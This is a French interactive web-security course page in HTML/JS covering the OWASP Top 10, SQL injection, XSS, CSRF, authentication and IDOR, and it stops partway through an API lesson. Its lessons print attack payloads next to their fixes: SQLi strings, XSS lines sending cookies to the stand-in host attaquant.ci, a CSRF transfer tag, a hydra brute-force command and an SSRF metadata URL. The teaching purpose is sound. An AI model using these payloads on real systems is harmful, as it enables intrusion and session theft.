@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Niveau 5 — Sécurité Web</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#070b14;color:#e8eef7;line-height:1.7;font-size:15px;min-height:100vh}
+h2{color:#fb923c;margin-bottom:12px;font-size:1.3rem}
+h3{color:#fdba74;margin:14px 0 8px;font-size:1rem}
+h4{color:#fcd34d;margin:10px 0 6px;font-size:.95rem}
+p{margin:8px 0;color:#cbd5e1}
+ul,ol{padding-left:22px;margin:8px 0}
+li{margin-bottom:5px;color:#cbd5e1}
+strong{color:#fbbf24}
+em{color:#fb923c;font-style:normal;font-weight:600}
+code{background:#0a1220;padding:2px 6px;border-radius:4px;color:#fb923c;font-size:.88em;font-family:monospace;border:1px solid #1e2a44}
+pre{background:#050914;padding:12px;border-radius:6px;overflow-x:auto;font-size:.82em;margin:10px 0;color:#fcd34d;border:1px solid #1e2a44;white-space:pre}
+a{color:#00d4ff;text-decoration:none}
+button{background:#f97316;color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:700;cursor:pointer;font-size:.9rem;font-family:inherit;margin:3px}
+button:hover{background:#ea580c}
+button.sec{background:#1a2540;color:#e8eef7;border:1px solid #2a3a5c}
+button.green{background:#22c55e;color:#052e16}
+button.gold{background:#fbbf24;color:#1a1200}
+header{background:#111a2e;padding:14px 20px;border-bottom:2px solid #f97316;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;position:sticky;top:0;z-index:10}
+.logo{color:#fb923c;font-weight:800;cursor:pointer;font-size:.95rem}
+.hs{color:#94a3b8;font-size:.78rem;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+.hs .pill{background:#0f1729;padding:5px 10px;border-radius:16px;border:1px solid #1e2a44;font-weight:600}
+.hs .pill b{color:#fb923c}
+.hs a{color:#ef4444;cursor:pointer;font-weight:700;padding:5px 10px}
+main{max-width:950px;margin:0 auto;padding:20px 16px 60px}
+.card{background:#111a2e;border-radius:12px;padding:20px;margin-bottom:14px;border:1px solid #1e2a44}
+.crumb{font-size:.82rem;color:#64748b;margin-bottom:14px;display:flex;gap:6px;flex-wrap:wrap}
+.crumb a{color:#00d4ff;cursor:pointer}
+.intro{background:#431407;padding:14px;border-radius:8px;margin:12px 0;border-left:4px solid #f97316;font-style:italic;color:#fed7aa}
+.cours{line-height:1.7}
+.cours h3{color:#fdba74}
+.cours h4{color:#fcd34d}
+.cours .box{padding:12px;border-radius:8px;margin:10px 0;border-left:3px solid #fbbf24;background:#3a2a0a;color:#f5e3a8}
+.cours .warn{padding:12px;border-radius:8px;margin:10px 0;border-left:3px solid #ef4444;background:#3a0f0f;color:#f4c4c4}
+.cours .good{padding:12px;border-radius:8px;margin:10px 0;border-left:3px solid #22c55e;background:#0a3a1a;color:#a7f3c4}
+.cours .bank{padding:12px;border-radius:8px;margin:10px 0;border-left:3px solid #22c55e;background:#0d3a1f;color:#b5e8c8}
+.cours table{width:100%;border-collapse:collapse;margin:10px 0;font-size:.88em}
+.cours th{background:#0f1729;color:#fb923c;padding:8px;text-align:left;border:1px solid #1e2a44}
+.cours td{border:1px solid #1e2a44;padding:8px;color:#cbd5e1}
+.quiz{background:#0a1220;padding:14px;border-radius:10px;margin-top:12px;border:1px solid #1e2a44}
+.q{margin-bottom:14px;padding:12px;background:#0f1729;border-radius:8px;border:1px solid #1e2a44}
+.q>p:first-child{font-weight:600;margin-bottom:10px;color:#e8eef7}
+.q label{display:block;padding:10px 12px;margin:5px 0;background:#111827;border-radius:7px;cursor:pointer;border:1.5px solid transparent;color:#cbd5e1;font-size:.9rem}
+.q label:hover{background:#1a2540}
+.q input{margin-right:10px}
+.ok{background:rgba(34,197,94,.2)!important;border-color:#22c55e!important;color:#a7f3c4!important}
+.ko{background:rgba(239,68,68,.2)!important;border-color:#ef4444!important;color:#fca5a5!important}
+.exp{background:#050914;padding:10px;border-radius:6px;margin-top:8px;font-size:.85em;color:#cbd5e1;border-left:3px solid #fbbf24;display:none}
+.res{margin-top:12px;padding:14px;border-radius:8px;font-weight:700;text-align:center}
+.res.g{background:rgba(34,197,94,.2);color:#a7f3c4;border:1px solid #22c55e}
+.res.r{background:rgba(239,68,68,.2);color:#fca5a5;border:1px solid #ef4444}
+.nav{margin-top:16px;display:flex;gap:8px;flex-wrap:wrap}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;margin-top:12px}
+.btn{background:#0f1729;padding:14px;border-radius:10px;cursor:pointer;border:2px solid transparent;text-align:left;transition:all .15s}
+.btn:hover{border-color:#f97316}
+.btn.done{border-color:#22c55e;background:#0d3a1f}
+.btn .n{font-weight:800;color:#fb923c;display:block;font-size:.68rem;text-transform:uppercase;letter-spacing:.5px}
+.btn.done .n{color:#86efac}
+.btn .ti{display:block;font-size:.88rem;color:#e8eef7;margin-top:5px;font-weight:600}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin:14px 0}
+.stat{background:#111a2e;padding:16px;border-radius:12px;border:1px solid #1e2a44;text-align:center;border-top:3px solid #f97316}
+.stat .big{font-size:2em;font-weight:800;color:#fb923c;display:block;line-height:1.1}
+.stat .lbl{font-size:.75em;color:#94a3b8;margin-top:6px;text-transform:uppercase;font-weight:600}
+.progress-bar{background:#0a1220;height:8px;border-radius:4px;overflow:hidden;margin:10px 0;border:1px solid #1e2a44}
+.progress-bar>div{height:100%;background:#f97316;transition:width .5s}
+.login-box{max-width:400px;margin:50px auto;background:#111a2e;padding:30px;border-radius:16px;border:1px solid #1e2a44}
+.login-box h2{text-align:center;margin-bottom:16px}
+.login-box input{width:100%;padding:12px;margin:8px 0;background:#0a1220;border:1.5px solid #1e2a44;border-radius:9px;color:#e8eef7;font-size:.95rem;font-family:inherit}
+.login-box input:focus{outline:none;border-color:#f97316}
+.login-box button{width:100%;margin-top:12px;padding:13px}
+.locked{text-align:center;padding:40px 20px;background:#0d1424;border-radius:14px;border:2px dashed #2a3a5c}
+.locked .icon{font-size:3.5em;margin-bottom:14px;opacity:.6}
+.locked h3{color:#fbbf24;font-size:1.2rem;margin:0 0 8px}
+.locked p{color:#94a3b8;font-size:.9rem}
+.locked .bar{width:180px;height:6px;background:#0a1220;border-radius:3px;margin:14px auto;overflow:hidden;border:1px solid #1e2a44}
+.locked .bar>div{height:100%;background:#f97316}
+.cert{background:#431407;padding:36px 26px;border-radius:14px;border:3px double #f97316;text-align:center}
+.cert .seal{width:70px;height:70px;border-radius:50%;background:#f97316;display:flex;align-items:center;justify-content:center;font-size:1.9rem;margin:0 auto 16px;border:3px solid #fed7aa}
+.cert .sub{color:#fb923c;font-size:.72rem;letter-spacing:2.5px;text-transform:uppercase;font-weight:800;margin-bottom:6px}
+.cert .title{font-family:Georgia,serif;font-size:1.4rem;font-weight:700;color:#fed7aa;margin:6px 0 16px}
+.cert .name{font-family:Georgia,serif;font-size:1.8rem;font-weight:700;color:#fff;padding:14px 0;border-bottom:2px solid #f97316;border-top:2px solid #f97316;margin:10px auto 18px;max-width:360px}
+.cert .details{display:flex;justify-content:center;gap:24px;flex-wrap:wrap;margin:20px 0 16px;font-size:.82rem;color:#94a3b8}
+.cert .details div{text-align:center}
+.cert .details strong{color:#00d4ff;display:block;font-size:.95rem;margin-top:3px}
+.cert .id{font-family:monospace;font-size:.7rem;color:#64748b;padding:8px;background:rgba(0,0,0,.3);border-radius:5px;display:inline-block;margin-top:12px}
+.cert .sig{margin-top:24px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:16px}
+.cert .sig-block{text-align:center;flex:1;min-width:140px}
+.cert .sig-line{border-top:1px solid #94a3b8;padding-top:6px;font-size:.75rem;color:#94a3b8;margin-top:24px}
+.cert .sig-name{font-family:Georgia,serif;font-style:italic;color:#fb923c;font-size:1rem}
+.cv-box{background:#fff;color:#1a1a1a;border-radius:12px;padding:30px;margin-top:14px;line-height:1.6}
+.cv-box h1{color:#9a3412;font-size:1.6rem;margin-bottom:4px}
+.cv-box .role{color:#ea580c;font-weight:600;margin-bottom:14px}
+.cv-box h2{color:#9a3412;font-size:.85rem;text-transform:uppercase;letter-spacing:1px;border-bottom:1.5px solid #cbd5e1;padding-bottom:4px;margin:16px 0 8px}
+.cv-box ul{padding-left:20px;margin:6px 0}
+.cv-box li{color:#334155;font-size:.9rem;margin-bottom:3px}
+.cv-box .badge{display:inline-block;padding:2px 8px;background:#ffedd5;color:#9a3412;border-radius:10px;font-size:.75rem;font-weight:700;border:1px solid #fed7aa;margin:2px}
+.tabs{display:flex;gap:6px;margin:12px 0;flex-wrap:wrap}
+.tab{padding:8px 14px;background:#0f1729;border-radius:8px;cursor:pointer;font-size:.82em;font-weight:600;color:#94a3b8;border:1.5px solid transparent}
+.tab.active{background:#f97316;color:#fff}
+.certs-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:12px;margin-top:12px}
+.cert-item{background:#0f1729;padding:14px;border-radius:10px;border-left:4px solid #f97316}
+.cert-item.free{border-left-color:#22c55e}
+.cert-item.paid{border-left-color:#fbbf24}
+.cert-item h4{margin:0 0 5px;font-size:.9em;color:#e8eef7}
+.cert-item .org{font-size:.72em;color:#94a3b8;margin-bottom:8px}
+.cert-item .tag{display:inline-block;padding:2px 8px;border-radius:16px;font-size:.66em;font-weight:700;margin-right:3px;margin-bottom:3px}
+.cert-item .tag.free{background:rgba(34,197,94,.15);color:#86efac}
+.cert-item .tag.paid{background:rgba(251,191,36,.15);color:#fde68a}
+.cert-item .tag.lvl{background:rgba(59,130,246,.15);color:#93c5fd}
+.cert-item p{font-size:.78em;color:#cbd5e1;margin:6px 0}
+.cert-item a{display:inline-block;padding:5px 10px;background:#1a2540;color:#00d4ff;border-radius:6px;font-size:.74em;font-weight:700;border:1px solid #2a3a5c;margin-top:6px}
+.jobs-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin-top:12px}
+.job{background:#0f1729;padding:14px;border-radius:10px;border-left:4px solid #22c55e}
+.job h4{margin:0 0 4px;color:#86efac;font-size:.9em}
+.job .org{font-size:.75em;color:#94a3b8;margin-bottom:6px}
+.job p{font-size:.8em;color:#cbd5e1;margin:6px 0}
+.job a{display:inline-block;padding:5px 12px;background:#1a2540;color:#00d4ff;border-radius:6px;font-size:.76em;font-weight:700;margin-top:6px;border:1px solid #2a3a5c}
+.exam{background:#431407;padding:16px;border-radius:12px;margin:10px 0;border-left:4px solid #f97316}
+.exam h4{color:#fed7aa;margin:0 0 6px;font-size:.98rem}
+.exam.locked{opacity:.55;border-left-color:#475569}
+.exam.passed{background:#0d3a1f;border-left-color:#22c55e}
+.exam.passed h4{color:#86efac}
+.sync-box{background:#0a1220;padding:14px;border-radius:10px;margin:10px 0;border:1px solid #1e2a44}
+.sync-box textarea{width:100%;min-height:100px;background:#050914;color:#00d4ff;border:1px solid #1e2a44;border-radius:6px;padding:10px;font-family:monospace;font-size:.7em;resize:vertical;word-break:break-all}
+.sync-box label{display:block;margin:6px 0 4px;color:#94a3b8;font-size:.82em;font-weight:600}
+.today{list-style:none;padding:0;margin:10px 0}
+.today li{padding:10px 12px;background:#0f1729;border-radius:6px;margin-bottom:6px;border-left:3px solid #22c55e;font-size:.87em;color:#cbd5e1}
+footer{text-align:center;padding:24px 20px;color:#64748b;font-size:.8em;font-weight:600;border-top:1px solid #1e2a44;margin-top:32px}
+#ver{position:fixed;bottom:8px;right:8px;background:#431407;color:#fb923c;font-family:monospace;font-size:.7em;padding:4px 8px;border-radius:4px;border:1px solid #f97316;z-index:999}
+#err{position:fixed;bottom:8px;left:8px;background:#3a0f0f;color:#fca5a5;font-family:monospace;font-size:.68em;padding:4px 8px;border-radius:4px;border:1px solid #ef4444;display:none;max-width:80%;z-index:999}
+@media print{header,footer,.nav,#ver,#err,.tabs,button{display:none!important}}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo" onclick="go('home')">🌐 Mon Drôle Parcours · Niveau 5</div>
+  <div class="hs" id="hs"></div>
+</header>
+<main id="app"></main>
+<footer>© H. N'GUESSAN ® — Niveau 5 · Sécurité Web</footer>
+<div id="ver">v5.3 chargé ✓</div>
+<div id="err"></div>
+
+<script>
+window.addEventListener('error', function(e) {
+  var el = document.getElementById('err');
+  if (el) { el.style.display = 'block'; el.textContent = 'ERREUR: ' + e.message; }
+});
+
+var KEY = 'mdpc_v53';
+var state = { currentUser: null, users: {} };
+try { var raw = localStorage.getItem(KEY); if (raw) state = JSON.parse(raw); } catch (e) {}
+
+function save() { try { localStorage.setItem(KEY, JSON.stringify(state)); } catch (e) {} header(); }
+function user() { return state.currentUser ? state.users[state.currentUser] : null; }
+function mkUser(n) { return { name: n, done: {}, certs: [], examens: {}, jours: {}, created: new Date().toISOString().slice(0,10) }; }
+function today() { return new Date().toISOString().slice(0,10); }
+
+function countDone(lvl) {
+  var u = user(); if (!u) return 0;
+  var c = 0, p = lvl + '_';
+  for (var k in u.done) { if (k.indexOf(p) === 0 && u.done[k]) c++; }
+  return c;
+}
+function isComplete(lvl) { return countDone(lvl) >= 10; }
+function isUnlocked(lvl) { if (lvl === 1) return true; return isComplete(lvl - 1); }
+
+function simulate() {
+  var u = user(); if (!u) return;
+  for (var i = 1; i <= 10; i++) { u.done['1_'+i]=true; u.done['2_'+i]=true; u.done['3_'+i]=true; u.done['4_'+i]=true; }
+  save();
+  alert('N1-N4 simulés. Niveau 5 débloqué !');
+  route();
+}
+
+function login() {
+  var el = document.getElementById('loginName'); if (!el) return;
+  var n = el.value.trim(); if (!n) { alert('Entre ton prénom'); return; }
+  var k = n.toLowerCase().replace(/\s+/g, '_');
+  if (!state.users[k]) state.users[k] = mkUser(n);
+  state.currentUser = k; save(); go('home');
+}
+function logout() { state.currentUser = null; save(); go('login'); }
+function go(h) { location.hash = h; }
+
+/* ============================================================
+   10 DÉFIS — contenu ultra-court pour éviter la troncature
+   ============================================================ */
+var DEFIS = [
+{id:1, titre:"Introduction à la sécurité web", intro:"Le web est la surface d attaque la plus vaste. Comprendre son architecture est le point de départ.",
+cours:"<h3>Le trio du web</h3><p>Toute app web repose sur <strong>client</strong> (navigateur) + <strong>serveur</strong> (Apache/Nginx) + <strong>base de données</strong>.</p><h3>Cycle d une requête</h3><ol><li>Client envoie HTTP (GET, POST)</li><li>Serveur → backend → BDD</li><li>Réponse HTML/JSON au client</li></ol><h3>Surface d attaque</h3><ul><li><strong>Navigateur</strong> — XSS, extensions</li><li><strong>Réseau</strong> — MITM, DNS spoofing</li><li><strong>Serveur</strong> — configs faibles</li><li><strong>App</strong> — injections, auth faible, IDOR</li><li><strong>BDD</strong> — SQLi, accès direct</li><li><strong>API</strong> — tokens faibles</li></ul><div class=\"box\">Une app web = une banque avec plusieurs portes. Chaque porte = surface d attaque.</div><div class=\"bank\">Apps bancaires auditées 24/7. Une faille = millions de pertes.</div><div class=\"warn\">HTTPS protège le transport, PAS contre SQLi, XSS, IDOR.</div>",
+cas:"<h3>Cas 1 — Reconnaissance</h3><p>Auditer portail.banque.ci avec autorisation.</p><ol><li>curl -I https://portail.banque.ci (headers)</li><li>ffuf/dirb pour endpoints</li><li>Chercher /.env, /.git/config, /admin</li></ol><h3>Cas 2 — Signes faiblesse</h3><ul><li>Server: Apache/2.2.15 = 2010</li><li>Pas de Content-Security-Policy</li><li>Cookie sans Secure ni HttpOnly</li></ul><h3>Cas 3 — Sous-domaines</h3><p>crt.sh révèle m.banque.ci, api.banque.ci, test.banque.ci. Test/dev = plus vulnérables.</p>",
+quiz:[
+{q:'Une app web repose sur ?',o:['Client seul','Client + serveur + BDD','Serveur seul','BDD seule'],c:1,e:'Trio.'},
+{q:'HTTPS protège contre ?',o:['SQLi','XSS','MITM transport','IDOR'],c:2,e:'Transport.'}
+]},
+
+{id:2, titre:"OWASP Top 10", intro:"Référence mondiale des failles web. Indispensable.",
+cours:"<h3>Les 10 failles (2021)</h3><table><tr><th>#</th><th>Faille</th></tr><tr><td>A01</td><td>Broken Access Control</td></tr><tr><td>A02</td><td>Cryptographic Failures</td></tr><tr><td>A03</td><td>Injection</td></tr><tr><td>A04</td><td>Insecure Design</td></tr><tr><td>A05</td><td>Security Misconfiguration</td></tr><tr><td>A06</td><td>Vulnerable Components</td></tr><tr><td>A07</td><td>Authentication Failures</td></tr><tr><td>A08</td><td>Data Integrity Failures</td></tr><tr><td>A09</td><td>Logging Failures</td></tr><tr><td>A10</td><td>SSRF</td></tr></table><h4>A01 — Broken Access Control</h4><p>L app ne vérifie pas assez les droits. Faille #1.</p><h4>A03 — Injection</h4><p>Code malveillant via entrée non filtrée : SQLi, command injection. Cause : concaténation.</p><h4>A05 — Misconfiguration</h4><p>Debug en prod, admin par défaut, .env exposé.</p><h4>A06 — Vulnerable Components</h4><p>Log4j, Spring4Shell, vieux jQuery.</p><h4>A07 — Authentication Failures</h4><p>Mdp faibles, pas de MFA, brute force.</p><h4>A10 — SSRF</h4><p>Serveur forcé de requêter une URL interne (169.254.169.254 = AWS metadata).</p><div class=\"box\">Code de la route du développeur. Ignorer = rouler en sens inverse.</div><div class=\"bank\">Les 3 plus critiques en banque : A01, A03, A07.</div>",
+cas:"<h3>Cas 1 — A01 (IDOR)</h3><p>/releve?id=123 → changer id=124. Si on voit le relevé d un autre → IDOR.</p><p>Correction : vérifier que l utilisateur connecté est propriétaire.</p><h3>Cas 2 — A05 (misconfig)</h3><pre>curl https://portail.banque.ci/.env\ncurl https://portail.banque.ci/.git/config</pre><p>Réponse 200 avec contenu → critique.</p><h3>Cas 3 — A10 (SSRF)</h3><p>Formulaire url=http://169.254.169.254/latest/meta-data/ → SSRF confirmé sur AWS.</p>",
+quiz:[
+{q:'Faille #1 OWASP 2021 ?',o:['SQLi','Broken Access Control','XSS','CSRF'],c:1,e:'A01.'},
+{q:'Log4Shell = ?',o:['A01','A03','A06','A10'],c:2,e:'Composant obsolète.'}
+]},
+
+{id:3, titre:"Injection SQL", intro:"La faille la plus emblématique. Permet de lire, modifier, supprimer une BDD.",
+cours:"<h3>Principe</h3><p><strong>SQLi</strong> = entrée utilisateur concaténée dans une requête SQL sans échappement.</p><h3>Exemple vulnérable</h3><pre>SELECT * FROM users WHERE login='$login' AND password='$password'</pre><p>Si login = <code>' OR '1'='1</code>, la condition devient toujours vraie.</p><h3>Types</h3><ul><li><strong>In-band</strong> — résultat dans la réponse</li><li><strong>Union-based</strong> — UNION pour joindre autre table</li><li><strong>Blind</strong> — vrai/faux ou temps</li><li><strong>Out-of-band</strong> — exfiltration DNS</li></ul><h3>Payloads</h3><pre>' OR 1=1 --\n' UNION SELECT user, password FROM mysql.user --</pre><h3>Correction — requêtes préparées</h3><pre>$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE login=? AND password=?');\n$stmt-&gt;execute([$login, $password]);</pre><p>Le <code>?</code> sépare code et données.</p><div class=\"box\">Formulaire papier sans protection. Un malin ajoute du code.</div><div class=\"warn\">addslashes ne suffit PAS. Requêtes préparées obligatoires.</div>",
+cas:"<h3>Cas 1 — Détecter</h3><pre>?id=1'         → erreur SQL ?\n?id=1 AND 1=1  → normal\n?id=1 AND 1=2  → vide ? (blind)\n?id=1' OR '1'='1 → tous les résultats ?</pre><h3>Cas 2 — UNION</h3><pre>?id=1 ORDER BY 1 --\n?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables --</pre><h3>Cas 3 — Corriger</h3><pre>// VULNÉRABLE\n$sql = \"SELECT * FROM user WHERE id=\" . $_GET['id'];</pre><pre>// SÉCURISÉ\n$stmt = $pdo-&gt;prepare('SELECT * FROM user WHERE id = ?');\n$stmt-&gt;execute([$_GET['id']]);</pre>",
+quiz:[
+{q:'Cause SQLi ?',o:['Serveur lent','Concaténation','Mdp faible','Certificat'],c:1,e:'Concaténation.'},
+{q:'Protection ?',o:['WAF','Requêtes préparées','Échapper','Renommer'],c:1,e:'Préparées.'}
+]},
+
+{id:4, titre:"XSS — Cross-Site Scripting", intro:"Exécuter du JavaScript dans le navigateur d un autre utilisateur. Faille la plus répandue.",
+cours:"<h3>Principe</h3><p><strong>XSS</strong> = JavaScript malveillant injecté dans une page vue par un autre utilisateur.</p><h3>3 types</h3><h4>1. Stocké (persistant)</h4><p>Script stocké en BDD (commentaire, profil). S exécute pour CHAQUE visiteur. Le plus dangereux.</p><pre>&lt;script&gt;fetch('https://attaquant.ci/?c='+document.cookie)&lt;/script&gt;</pre><h4>2. Réfléchi</h4><p>Script reflété par le serveur. L attaquant envoie un lien piégé.</p><h4>3. DOM-based</h4><p>Script exécuté côté client, sans passer par le serveur.</p><h3>Impact</h3><ul><li>Voler cookie session (si pas HttpOnly)</li><li>Actions au nom de la victime</li><li>Faux formulaire login</li></ul><h3>Correction</h3><ul><li><strong>Échappement HTML</strong> : &amp;lt; → &amp;amp;lt; etc.</li><li><strong>CSP</strong> : Content-Security-Policy: default-src 'self'</li><li><strong>HttpOnly</strong> sur cookies</li><li><strong>Pas innerHTML</strong> — textContent ou DOMPurify</li></ul><div class=\"box\">Tableau public : quelqu un ajoute « donnez votre argent à Jean ».</div><div class=\"warn\">Filtrer &lt;script&gt; ne suffit PAS. Il y a &lt;img onerror&gt;, &lt;svg onload&gt;...</div>",
+cas:"<h3>Cas 1 — Tester XSS réfléchi</h3><p>Chercher <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. Si popup → confirmé.</p><p>Tester aussi <code>&lt;img src=x onerror=alert(1)&gt;</code>.</p><h3>Cas 2 — XSS stocké (lab)</h3><pre>&lt;script&gt;new Image().src='https://attaquant.ci/log?c='+document.cookie&lt;/script&gt;</pre><h3>Cas 3 — Corriger</h3><pre>// VULNÉRABLE\nres.send('&lt;h1&gt;' + user.name + '&lt;/h1&gt;');</pre><pre>// SÉCURISÉ\nconst escapeHtml = require('escape-html');\nres.send('&lt;h1&gt;' + escapeHtml(user.name) + '&lt;/h1&gt;');</pre>",
+quiz:[
+{q:'Combien de types XSS ?',o:['1','2','3','4'],c:2,e:'Stocké, réfléchi, DOM.'},
+{q:'HttpOnly ?',o:['Empêche JS','Chiffre','Signe','Envoie'],c:0,e:'document.cookie bloqué.'}
+]},
+
+{id:5, titre:"CSRF — Cross-Site Request Forgery", intro:"Forcer un utilisateur authentifié à exécuter une action non désirée.",
+cours:"<h3>Principe</h3><p><strong>CSRF</strong> exploite le fait que le navigateur envoie automatiquement les cookies vers le domaine concerné.</p><h3>Scénario</h3><ol><li>Victime connectée à banque.ci</li><li>Visite site-pirate.ci qui contient :</li></ol><pre>&lt;img src=\"https://banque.ci/virement?to=attaquant&amp;amount=10000\"&gt;</pre><ol start=\"3\"><li>Le navigateur envoie la requête avec le cookie → virement exécuté</li></ol><h3>Correction — token CSRF</h3><p>Ajouter un <strong>token aléatoire unique</strong> dans chaque formulaire, vérifié côté serveur.</p><pre>&lt;input type=\"hidden\" name=\"csrf_token\" value=\"x8f3a2...\"&gt;</pre><h3>Autres protections</h3><ul><li><strong>SameSite=Strict</strong> sur cookies</li><li><strong>Vérifier Origin/Referer</strong></li><li><strong>Re-authentification</strong> pour actions sensibles</li><li><strong>Jamais d action en GET</strong></li></ul><h3>CSRF vs XSS</h3><table><tr><th>Critère</th><th>XSS</th><th>CSRF</th></tr><tr><td>Exécution</td><td>Code JS</td><td>Requête victime</td></tr><tr><td>Cible</td><td>Navigateur</td><td>Serveur</td></tr><tr><td>Protection</td><td>Échappement, CSP</td><td>Token, SameSite</td></tr></table><div class=\"box\">Un pickpocket glisse un papier sous votre main. Vous signez sans le voir.</div><div class=\"bank\">Virement en GET sans token = faille critique.</div>",
+cas:"<h3>Cas 1 — Tester CSRF</h3><p>Vérifier présence d un champ <code>csrf_token</code>. Absent → probablement vulnérable.</p><h3>Cas 2 — Corriger (Flask)</h3><pre>from flask_wtf.csrf import CSRFProtect\napp = Flask(__name__)\nCSRFProtect(app)</pre><h3>Cas 3 — Cookie SameSite</h3><pre>Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict</pre><p>SameSite=Strict empêche l envoi depuis un autre domaine.</p>",
+quiz:[
+{q:'CSRF exploite ?',o:['SQLi','Confiance navigateur','Antivirus','Certificat'],c:1,e:'Cookies auto.'},
+{q:'Protection ?',o:['Token CSRF','HTTPS','Antivirus','WAF'],c:0,e:'Token unique.'}
+]},
+
+{id:6, titre:"Authentification et sessions", intro:"Porte d entrée de toute app. Une faille = tout tombe.",
+cours:"<h3>Auth vs Autorisation</h3><ul><li><strong>Authentification</strong> — qui es-tu ?</li><li><strong>Autorisation</strong> — que peux-tu faire ?</li></ul><h3>Méthodes</h3><ul><li>Mot de passe</li><li>MFA (TOTP, biométrie)</li><li>OAuth2 / OIDC</li><li>Passkeys / FIDO2</li></ul><h3>Failles A07</h3><ul><li>Mdp faibles (123456)</li><li>Pas de rate limiting</li><li>Énumération comptes</li><li>Reset mdp faible</li><li>Session non invalidée</li><li>Session dans URL</li><li>Cookie sans Secure</li></ul><h3>Sessions vs JWT</h3><table><tr><th>Critère</th><th>Session</th><th>JWT</th></tr><tr><td>Stockage</td><td>Serveur</td><td>Stateless</td></tr><tr><td>Révocation</td><td>Facile</td><td>Difficile</td></tr></table><h3>Bonnes pratiques</h3><ul><li>Mdp 12+ caractères</li><li>Argon2id / bcrypt (JAMAIS MD5)</li><li>MFA TOTP ou FIDO2</li><li>Rate limit 5/15min</li><li>Message générique « identifiants invalides »</li><li>Cookie Secure + HttpOnly + SameSite=Strict</li><li>Logout serveur</li><li>JWT : 15 min + refresh token</li></ul><div class=\"box\">Videur boîte de nuit : vérifie carte (auth), autorise VIP/bar (autorisation).</div><div class=\"bank\">Banques imposent MFA sur toutes connexions client.</div>",
+cas:"<h3>Cas 1 — Brute force</h3><p>Tester 10 logins faux. Réponse rapide = pas de rate limiting.</p><pre>hydra -l admin -P passwords.txt banque.ci https-post-form \"/login:user=^USER^&amp;pass=^PASS^:F=incorrect\"</pre><h3>Cas 2 — Énumération</h3><p>admin/fake → « mdp incorrect ». fakeuser/fake → « user inconnu ». Différent = énumération.</p><p>Correction : « identifiants invalides ».</p><h3>Cas 3 — Sécuriser session</h3><pre>Set-Cookie: sessionid=abc; HttpOnly; Secure; SameSite=Strict; Max-Age=1800</pre>",
+quiz:[
+{q:'Auth = ?',o:['Que peux-tu ?','Qui es-tu ?','Où ?','Quand ?'],c:1,e:'Identité.'},
+{q:'Hash recommandé ?',o:['MD5','SHA-1','Argon2id','Base64'],c:2,e:'Argon2id.'}
+]},
+
+{id:7, titre:"Contrôle d accès — IDOR", intro:"Faille #1 OWASP. Accéder aux données d autres utilisateurs.",
+cours:"<h3>Niveaux de contrôle</h3><ul><li><strong>Vertical</strong> — user vs admin</li><li><strong>Horizontal</strong> — user A vs user B</li></ul><h3>IDOR</h3><p>Identifiant prévisible dans l URL, SANS vérifier la propriété.</p><pre>GET /facture?id=1234</pre><p>Attaquant teste id=1235, id=1236, id=1. Si voit factures d autres → IDOR.</p><h3>Vertical privilege escalation</h3><ul><li>/admin/panel accessible directement</li><li>Paramètre isAdmin=true modifiable</li><li>JWT role:user modifiable</li></ul><h3>Masquage côté client</h3><p>Bouton masqué en CSS mais endpoint API accessible.</p><h3>Correction</h3><pre>if (facture.userId !== req.session.userId) return 403;</pre><p>Et utiliser des UUID v4 plutôt que des IDs séquentiels.</p><div class=\"box\">Hôtel : clé 101 qui ouvre 102 = IDOR.</div><div class=\"bank\">IDOR = relevés, virements, données clients exposés.</div><div class=\"warn\">Cacher bouton CSS ne protège rien.</div>",
+cas:"<h3>Cas 1 — Détecter IDOR</h3><ol><li>Compte A : /api/user/123/profile</li><li>Compte B : /api/user/124/profile (124 = A)</li><li>B reçoit données A → IDOR</li></ol><p>Tester aussi : id=1, id=0, id=-1, id=null.</p><h3>Cas 2 — Vertical escalation</h3><ol><li>Chercher /admin dans code JS</li><li>Tester avec compte normal : GET /admin/users</li><li>Réponse 200 → faille</li></ol><h3>Cas 3 — Corriger</h3><pre>// VULNÉRABLE\napp.get('/facture/:id', async (req, res) =&gt; {\n  const f = await db.facture.findById(req.params.id);\n  res.json(f);\n});</pre><pre>// SÉCURISÉ\napp.get('/facture/:id', async (req, res) =&gt; {\n  const f = await db.facture.findById(req.params.id);\n  if (!f) return res.status(404).end();\n  if (f.userId !== req.user.id) return res.status(403).end();\n  res.json(f);\n});</pre>",
+quiz:[
+{q:'IDOR = ?',o:['Injection','Contrôle accès','Crypto','Réseau'],c:1,e:'Accès non autorisé.'},
+{q:'Cacher bouton CSS ?',o:['Protège','Ne protège rien','Chiffre','Signe'],c:1,e:'Requêtes directes.'}
+]},
+
+{id:8, titre:"Sécurité des API", intro:"API partout : mobiles, SPA, microservices. Moins protégées que le web.",
